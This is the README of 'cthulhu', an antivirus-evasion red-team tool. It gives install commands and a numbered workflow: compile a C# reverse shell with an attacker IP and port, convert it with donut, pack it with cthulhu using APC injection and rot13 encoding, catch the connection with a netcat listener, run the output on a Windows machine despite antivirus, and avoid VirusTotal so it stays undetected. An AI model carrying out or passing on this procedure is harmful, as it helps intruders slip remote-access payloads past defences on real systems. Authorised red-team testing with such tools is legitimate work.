![immagine](http://www.clker.com/cliparts/0/c/f/0/1194984914309460086elder_sign_nurbldoff_01r.svg.med.png)

# cthulhu

AV Evasion, Red Team tool, a FourEye fork (by Leginbo https://github.com/lengjibo) 

# Install

git clone https://github.com/foxlox/cthulhu

cd cthulhu

chmod 755 setup.sh

./setup.sh

python3 cthulhu.py
    
    
![immagine](https://user-images.githubusercontent.com/28823598/128512455-1bad09e2-9616-4333-ad37-db895705ff02.png)
  
    
![immagine](https://user-images.githubusercontent.com/28823598/128512283-4e75f989-f5fd-4e54-b954-7741fc231add.png)


# Example

1. Create a new Visual Studio C# Console Project

2. Add reverse.cs and set IP and PORT

3. Build it

4. go to your Linux box

5. $ donut compiledapp.exe -o ca.bin

6. $ python3 cthulhu.py -method apc -arch x86 -bin ca.bin -enc rot13

    => [+]shellcode created: /tmp/shellcode.exe

8. Bind the right port with netcat on your linux box and wait.

9. Copy shellcode.exe on Windows box and run it. Don't forget to start your Antivirus.

10. Don't upload your shellcode.exe on Virustotal


    *fox
    
